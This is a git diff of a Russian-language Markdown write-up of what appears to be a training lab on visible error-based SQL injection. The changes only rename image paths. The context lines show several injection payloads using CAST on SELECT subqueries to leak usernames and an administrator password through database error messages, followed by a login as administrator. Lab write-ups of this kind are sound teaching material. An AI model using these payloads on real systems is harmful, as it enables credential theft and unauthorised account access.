@@ -50,7 +50,7 @@ dUrA4au9zQX6dlb5'-- -Error
 
 Я получил следующую ошибку с описанием:
 
-![IMG](/assets/images/IMG_union_sql/IMG_Visible-error-based-SQL-injection/1.png){: height="200" .align-center}
+![IMG](/assets/images/IMG_union_sqli/IMG_Visible-error-based-SQL-injection/1.png){: height="200" .align-center}
 
 Из текста видно, что для обрамления используются одинарные кавычки. Тогда подберу пейлоад:
 
@@ -69,7 +69,7 @@ dUrA4au9zQX6dlb5' and 1=CAST((SELECT 'a') AS int)-- -Error
 
 Я получил следующую ошибку:
 
-![IMG](/assets/images/IMG_union_sql/IMG_Visible-error-based-SQL-injection/2.png){: height="200" .align-center}
+![IMG](/assets/images/IMG_union_sqli/IMG_Visible-error-based-SQL-injection/2.png){: height="200" .align-center}
 
 Попробую получить имена пользователей:
 
@@ -77,7 +77,7 @@ dUrA4au9zQX6dlb5' and 1=CAST((SELECT 'a') AS int)-- -Error
 ' and 1=CAST((SELECT username FROM users) AS int)-- -Error
 ```
 
-![IMG](/assets/images/IMG_union_sql/IMG_Visible-error-based-SQL-injection/3.png){: height="200" .align-center}
+![IMG](/assets/images/IMG_union_sqli/IMG_Visible-error-based-SQL-injection/3.png){: height="200" .align-center}
 
 Из сообщения видно, что в БД лежит больше одного логина, поэтому я использую `LIMIT`, чтобы получать значения по одному:
 
@@ -87,7 +87,7 @@ dUrA4au9zQX6dlb5' and 1=CAST((SELECT 'a') AS int)-- -Error
 
 Получил следующий ответ:
 
-![IMG](/assets/images/IMG_union_sql/IMG_Visible-error-based-SQL-injection/4.png){: height="200" .align-center}
+![IMG](/assets/images/IMG_union_sqli/IMG_Visible-error-based-SQL-injection/4.png){: height="200" .align-center}
 
 Получу пароль таким же образом:
 
@@ -95,10 +95,10 @@ dUrA4au9zQX6dlb5' and 1=CAST((SELECT 'a') AS int)-- -Error
 ' and 1=CAST((SELECT password FROM users LIMIT 1) AS int)-- -
 ```
 
-![IMG](/assets/images/IMG_union_sql/IMG_Visible-error-based-SQL-injection/5.png){: height="200" .align-center}
+![IMG](/assets/images/IMG_union_sqli/IMG_Visible-error-based-SQL-injection/5.png){: height="200" .align-center}
 
 Пароль получен: `oar4hhxs5cflalzuprmh`. Попробую зайти в аккаунт администратора:
 
-![IMG](/assets/images/IMG_union_sql/IMG_Visible-error-based-SQL-injection/6.png){: height="200" .align-center}
+![IMG](/assets/images/IMG_union_sqli/IMG_Visible-error-based-SQL-injection/6.png){: height="200" .align-center}
 
 Лаба решена:3
